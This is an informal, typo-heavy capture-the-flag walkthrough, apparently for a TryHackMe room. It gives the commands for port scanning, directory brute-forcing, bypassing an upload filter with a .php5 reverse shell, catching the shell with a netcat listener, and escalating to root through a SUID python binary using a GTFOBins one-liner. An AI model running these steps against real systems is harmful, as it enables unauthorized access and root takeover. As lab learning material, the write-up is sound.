step 1 = scan for the ports  SYNTAX = nmap -A ip address

step 2 = found port 80 which means HTTP is running 

step 3 = check on the browser (always check the page source cod)

step 4 = using gobuster to find hidden directories SYNTAX = gobuster -u http://IP ADDRESS -w /home/kali/Tryhackme/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,css,js,txt,py 
         (found hidden page uploads and panel)
step 5 = looks like we cann upload a reverse shell file of php 

step 6 = uploading the file but it is not acceting it 

step 7 = changing the ip address adn port number in the reverse shell to get the shell on our computer

step 8 = changing the extension to php5 

step 9 =file uploaded succesfully 

step 10 = starting a listner SYNTAX = nc -lvnp (specified port)

step 11 = got the sheel now finding the user.txt command with find command 

          find / -name user.txt

step 12 = privilege escalate, finding the SUID bit 

       

 what is the use of SUID bit ??
 
 First we need to find SUID bit file in the system   SYNTAX = find / -user root -perm /4000 

 This will give us all FILE with SUID with permission and withour permission to get only with permission  SYNTAX= find / -user root -perm /4000 2>/dev/null

 


 ----->>>> Explanation <<<<-----




 Example we are not allowed to chnage to passwd diretory so we can't view this file ,it means we don't have privilege to the file but there might be some case where if we change our 

 password than there might be a change in the passwd file tooo so using this we can change the information inside the passwd file without having the privilege or authority so thats why 

 SUID file is required to be searched and we need to see carefully which might be the one we can exploit it (IN MY CASE IT WAS /usr/bin/python) which make sense we can escalate our 

 privilege using python 

 searching for python privilege escalation on gtfgobins (https://gtfobins.github.io/gtfobins/python/) found  SYNTAX = ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'




step 13 = with the SUID file found run the command  /usr/bin/./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

          and it will give you the root terminal 

          now find the root.txt  SYNTAX find /root -name root.txt 


                                                                               ---->>>>FINISHED<<<<----
